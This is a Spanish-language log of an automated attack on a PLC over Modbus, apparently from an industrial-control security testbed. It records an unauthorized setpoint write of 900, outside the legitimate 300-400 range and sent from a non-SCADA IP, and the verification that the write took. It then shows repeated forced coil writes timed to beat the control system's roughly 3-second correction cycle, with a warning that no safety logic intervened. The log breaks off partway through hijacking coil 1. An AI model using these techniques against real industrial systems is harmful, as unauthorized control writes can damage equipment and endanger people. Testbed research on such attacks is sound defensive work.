[2026-09-09 20:04:39] [INFO] ########## INICIO ataque 3: escritura no autorizada Modbus ##########
[2026-09-09 20:04:39] [INFO] Guardando log completo de esta ejecucion en: /scripts/attack3/attack3_output.log
[2026-09-09 20:04:39] [INFO] Manifiesto de reconocimiento encontrado (/scripts/attack3/recon_manifest.json). Usando direcciones DESCUBIERTAS, sin conocimiento previo: setpoint=15, coils con actividad=[0, 1, 2, 3, 4, 5, 6]
[2026-09-09 20:04:39] [INFO] === FASE A: setpoint no autorizado ===
[2026-09-09 20:04:39] [INFO] Escribiendo registro 15 (setpoint) = 900 (fuera del rango legitimo 300-400, y desde una IP distinta a la de SCADA)
[2026-09-09 20:04:39] [INFO] Escritura de setpoint no autorizada completada.
[2026-09-09 20:04:40] [INFO] Verificacion: el PLC ahora reporta el registro15 = 900
[2026-09-09 20:04:43] [INFO] === FASE B: barrido de 7 coil(s) descubierto(s) con actividad, 90s cada uno ===
[2026-09-09 20:04:43] [INFO] === FASE B:(1/7: secuestro del coil 0) ===
[2026-09-09 20:04:43] [INFO] Forzando el coil 0 a CERRADO cada 1.0s durante 90s, para ganarle la carrera al ciclo de correccion del BPCS (~3s).
[2026-09-09 20:04:43] [INFO]   coil 0, intento 1: estado = inactivo/false
[2026-09-09 20:04:44] [INFO]   coil 0, intento 2: estado = inactivo/false
[2026-09-09 20:04:45] [INFO]   coil 0, intento 3: estado = inactivo/false
[2026-09-09 20:04:46] [INFO]   coil 0, intento 4: estado = inactivo/false
[2026-09-09 20:04:47] [INFO]   coil 0, intento 5: estado = inactivo/false
[2026-09-09 20:04:48] [INFO]   coil 0, intento 6: estado = inactivo/false
[2026-09-09 20:04:49] [INFO]   coil 0, intento 7: estado = inactivo/false
[2026-09-09 20:04:50] [INFO]   coil 0, intento 8: estado = inactivo/false
[2026-09-09 20:04:51] [INFO]   coil 0, intento 9: estado = inactivo/false
[2026-09-09 20:04:52] [INFO]   coil 0, intento 10: estado = inactivo/false
[2026-09-09 20:04:53] [INFO]   coil 0, intento 11: estado = inactivo/false
[2026-09-09 20:04:54] [INFO]   coil 0, intento 12: estado = inactivo/false
[2026-09-09 20:04:55] [INFO]   coil 0, intento 13: estado = inactivo/false
[2026-09-09 20:04:56] [INFO]   coil 0, intento 14: estado = inactivo/false
[2026-09-09 20:04:57] [INFO]   coil 0, intento 15: estado = inactivo/false
[2026-09-09 20:04:59] [INFO]   coil 0, intento 16: estado = inactivo/false
[2026-09-09 20:05:00] [INFO]   coil 0, intento 17: estado = inactivo/false
[2026-09-09 20:05:01] [INFO]   coil 0, intento 18: estado = inactivo/false
[2026-09-09 20:05:02] [INFO]   coil 0, intento 19: estado = inactivo/false
[2026-09-09 20:05:03] [INFO]   coil 0, intento 20: estado = inactivo/false
[2026-09-09 20:05:04] [INFO]   coil 0, intento 21: estado = inactivo/false
[2026-09-09 20:05:05] [INFO]   coil 0, intento 22: estado = inactivo/false
[2026-09-09 20:05:06] [INFO]   coil 0, intento 23: estado = inactivo/false
[2026-09-09 20:05:07] [INFO]   coil 0, intento 24: estado = inactivo/false
[2026-09-09 20:05:08] [INFO]   coil 0, intento 25: estado = inactivo/false
[2026-09-09 20:05:09] [INFO]   coil 0, intento 26: estado = inactivo/false
[2026-09-09 20:05:10] [INFO]   coil 0, intento 27: estado = inactivo/false
[2026-09-09 20:05:11] [INFO]   coil 0, intento 28: estado = inactivo/false
[2026-09-09 20:05:12] [INFO]   coil 0, intento 29: estado = inactivo/false
[2026-09-09 20:05:13] [INFO]   coil 0, intento 30: estado = inactivo/false
[2026-09-09 20:05:14] [INFO]   coil 0, intento 31: estado = inactivo/false
[2026-09-09 20:05:15] [INFO]   coil 0, intento 32: estado = inactivo/false
[2026-09-09 20:05:16] [INFO]   coil 0, intento 33: estado = inactivo/false
[2026-09-09 20:05:17] [INFO]   coil 0, intento 34: estado = inactivo/false
[2026-09-09 20:05:18] [INFO]   coil 0, intento 35: estado = inactivo/false
[2026-09-09 20:05:19] [INFO]   coil 0, intento 36: estado = inactivo/false
[2026-09-09 20:05:20] [INFO]   coil 0, intento 37: estado = inactivo/false
[2026-09-09 20:05:21] [INFO]   coil 0, intento 38: estado = inactivo/false
[2026-09-09 20:05:22] [INFO]   coil 0, intento 39: estado = inactivo/false
[2026-09-09 20:05:23] [INFO]   coil 0, intento 40: estado = inactivo/false
[2026-09-09 20:05:24] [INFO]   coil 0, intento 41: estado = inactivo/false
[2026-09-09 20:05:25] [INFO]   coil 0, intento 42: estado = inactivo/false
[2026-09-09 20:05:26] [INFO]   coil 0, intento 43: estado = inactivo/false
[2026-09-09 20:05:27] [INFO]   coil 0, intento 44: estado = inactivo/false
[2026-09-09 20:05:28] [INFO]   coil 0, intento 45: estado = inactivo/false
[2026-09-09 20:05:29] [INFO]   coil 0, intento 46: estado = inactivo/false
[2026-09-09 20:05:30] [INFO]   coil 0, intento 47: estado = inactivo/false
[2026-09-09 20:05:31] [INFO]   coil 0, intento 48: estado = inactivo/false
[2026-09-09 20:05:32] [INFO]   coil 0, intento 49: estado = inactivo/false
[2026-09-09 20:05:33] [INFO]   coil 0, intento 50: estado = inactivo/false
[2026-09-09 20:05:34] [INFO]   coil 0, intento 51: estado = inactivo/false
[2026-09-09 20:05:35] [INFO]   coil 0, intento 52: estado = inactivo/false
[2026-09-09 20:05:36] [INFO]   coil 0, intento 53: estado = inactivo/false
[2026-09-09 20:05:37] [INFO]   coil 0, intento 54: estado = inactivo/false
[2026-09-09 20:05:38] [INFO]   coil 0, intento 55: estado = inactivo/false
[2026-09-09 20:05:39] [INFO]   coil 0, intento 56: estado = inactivo/false
[2026-09-09 20:05:40] [INFO]   coil 0, intento 57: estado = inactivo/false
[2026-09-09 20:05:41] [INFO]   coil 0, intento 58: estado = inactivo/false
[2026-09-09 20:05:42] [INFO]   coil 0, intento 59: estado = inactivo/false
[2026-09-09 20:05:43] [INFO]   coil 0, intento 60: estado = inactivo/false
[2026-09-09 20:05:44] [INFO]   coil 0, intento 61: estado = inactivo/false
[2026-09-09 20:05:45] [INFO]   coil 0, intento 62: estado = inactivo/false
[2026-09-09 20:05:46] [INFO]   coil 0, intento 63: estado = inactivo/false
[2026-09-09 20:05:47] [INFO]   coil 0, intento 64: estado = inactivo/false
[2026-09-09 20:05:48] [INFO]   coil 0, intento 65: estado = inactivo/false
[2026-09-09 20:05:49] [INFO]   coil 0, intento 66: estado = inactivo/false
[2026-09-09 20:05:50] [INFO]   coil 0, intento 67: estado = inactivo/false
[2026-09-09 20:05:51] [INFO]   coil 0, intento 68: estado = inactivo/false
[2026-09-09 20:05:52] [INFO]   coil 0, intento 69: estado = inactivo/false
[2026-09-09 20:05:53] [INFO]   coil 0, intento 70: estado = inactivo/false
[2026-09-09 20:05:54] [INFO]   coil 0, intento 71: estado = inactivo/false
[2026-09-09 20:05:55] [INFO]   coil 0, intento 72: estado = inactivo/false
[2026-09-09 20:05:56] [INFO]   coil 0, intento 73: estado = inactivo/false
[2026-09-09 20:05:57] [INFO]   coil 0, intento 74: estado = inactivo/false
[2026-09-09 20:05:58] [INFO]   coil 0, intento 75: estado = inactivo/false
[2026-09-09 20:05:59] [INFO]   coil 0, intento 76: estado = inactivo/false
[2026-09-09 20:06:00] [INFO]   coil 0, intento 77: estado = inactivo/false
[2026-09-09 20:06:01] [INFO]   coil 0, intento 78: estado = inactivo/false
[2026-09-09 20:06:02] [INFO]   coil 0, intento 79: estado = inactivo/false
[2026-09-09 20:06:03] [INFO]   coil 0, intento 80: estado = inactivo/false
[2026-09-09 20:06:04] [INFO]   coil 0, intento 81: estado = inactivo/false
[2026-09-09 20:06:05] [INFO]   coil 0, intento 82: estado = inactivo/false
[2026-09-09 20:06:06] [INFO]   coil 0, intento 83: estado = inactivo/false
[2026-09-09 20:06:07] [INFO]   coil 0, intento 84: estado = inactivo/false
[2026-09-09 20:06:08] [INFO]   coil 0, intento 85: estado = inactivo/false
[2026-09-09 20:06:09] [INFO]   coil 0, intento 86: estado = inactivo/false
[2026-09-09 20:06:10] [INFO]   coil 0, intento 87: estado = inactivo/false
[2026-09-09 20:06:11] [INFO]   coil 0, intento 88: estado = inactivo/false
[2026-09-09 20:06:12] [INFO]   coil 0, intento 89: estado = inactivo/false
[2026-09-09 20:06:13] [INFO]   coil 0, intento 90: estado = inactivo/false
[2026-09-09 20:06:14] [INFO] Coil 0: 90 escrituras forzadas en 90s.
[2026-09-09 20:06:14] [WARNING] Coil 0: no se observo intervencion de ninguna logica de seguridad durante la ventana de ataque.
[2026-09-09 20:06:16] [INFO] === FASE B:(2/7: secuestro del coil 1) ===
[2026-09-09 20:06:16] [INFO] Forzando el coil 1 a CERRADO cada 1.0s durante 90s, para ganarle la carrera al ciclo de correccion del BPCS (~3s).
[2026-09-09 20:06:16] [INFO]   coil 1, intento 1: estado = inactivo/false
[2026-09-09 20:06:17] [INFO]   coil 1, intento 2: estado = inactivo/false
[2026-09-09 20:06:18] [INFO]   coil 1, intento 3: estado = inactivo/false
[2026-09-09 20:06:19] [INFO]   coil 1, intento 4: estado = inactivo/false
[2026-09-09 20:06:20] [INFO]   coil 1, intento 5: estado = inactivo/false
[2026-09-09 20:06:21] [INFO]   coil 1, intento 6: estado = inactivo/false
[2026-09-09 20:06:22] [INFO]   coil 1, intento 7: estado = inactivo/false
[2026-09-09 20:06:23] [INFO]   coil 1, intento 8: estado = inactivo/false
[2026-09-09 20:06:24] [INFO]   coil 1, intento 9: estado = inactivo/false
[2026-09-09 20:06:25] [INFO]   coil 1, intento 10: estado = inactivo/false
[2026-09-09 20:06:26] [INFO]   coil 1, intento 11: estado = inactivo/false
[2026-09-09 20:06:27] [INFO]   coil 1, intento 12: estado = inactivo/false
[2026-09-09 20:06:28] [INFO]   coil 1, intento 13: estado = inactivo/false
[2026-09-09 20:06:29] [INFO]   coil 1, intento 14: estado = inactivo/false
[2026-09-09 20:06:30] [INFO]   coil 1, intento 15: estado = inactivo/false
[2026-09-09 20:06:31] [INFO]   coil 1, intento 16: estado = inactivo/false
[2026-09-09 20:06:32] [INFO]   coil 1, intento 17: estado = inactivo/false
[2026-09-09 20:06:33] [INFO]   coil 1, intento 18: estado = inactivo/false
[2026-09-09 20:06:34] [INFO]   coil 1, intento 19: estado = inactivo/false
[2026-09-09 20:06:35] [INFO]   coil 1, intento 20: estado = inactivo/false
[2026-09-09 20:06:36] [INFO]   coil 1, intento 21: estado = inactivo/false
[2026-09-09 20:06:37] [INFO]   coil 1, intento 22: estado = inactivo/false
[2026-09-09 20:06:38] [INFO]   coil 1, intento 23: estado = inactivo/false
[2026-09-09 20:06:39] [INFO]   coil 1, intento 24: estado = inactivo/false
[2026-09-09 20:06:40] [INFO]   coil 1, intento 25: estado = inactivo/false
[2026-09-09 20:06:41] [INFO]   coil 1, intento 26: estado = inactivo/false
[2026-09-09 20:06:42] [INFO]   coil 1, intento 27: estado = inactivo/false
[2026-09-09 20:06:43] [INFO]   coil 1, intento 28: estado = inactivo/false
[2026-09-09 20:06:44] [INFO]   coil 1, intento 29: estado = inactivo/false
[2026-09-09 20:06:45] [INFO]   coil 1, intento 30: estado = inactivo/false
[2026-09-09 20:06:46] [INFO]   coil 1, intento 31: estado = inactivo/false
[2026-09-09 20:06:47] [INFO]   coil 1, intento 32: estado = inactivo/false
[2026-09-09 20:06:48] [INFO]   coil 1, intento 33: estado = inactivo/false
[2026-09-09 20:06:49] [INFO]   coil 1, intento 34: estado = inactivo/false
[2026-09-09 20:06:50] [INFO]   coil 1, intento 35: estado = inactivo/false
[2026-09-09 20:06:51] [INFO]   coil 1, intento 36: estado = inactivo/false
[2026-09-09 20:06:52] [INFO]   coil 1, intento 37: estado = inactivo/false
